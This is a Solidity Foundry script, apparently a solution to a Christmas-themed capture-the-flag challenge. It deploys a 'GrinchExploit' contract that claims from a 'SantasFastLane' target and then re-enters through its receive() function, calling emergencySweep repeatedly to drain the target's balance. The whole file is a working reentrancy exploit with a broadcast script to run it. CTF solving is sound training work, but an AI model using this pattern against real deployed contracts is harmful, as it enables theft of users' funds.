// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Script.sol";
import "../src/GiftDistributor.sol";
import "../src/Setup.sol";

contract GrinchExploit {
    SantasFastLane public target;

    constructor(address _target) {
        // FIX: Cast to payable first
        target = SantasFastLane(payable(_target));
    }

    function attack() external {
        target.checkListAndClaim();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.emergencySweep();
        }
    }
}

contract Solver is Script {
    function run() external {
        address setupAddr = vm.envAddress("SETUP_ADDR");
        
        vm.startBroadcast();

        Setup setup = Setup(setupAddr);
        // FIX: Ensure address is payable before casting
        SantasFastLane target = SantasFastLane(payable(setup.target()));
        GrinchExploit grinch = new GrinchExploit(address(target));

        grinch.attack();

        vm.stopBroadcast();
    }
}
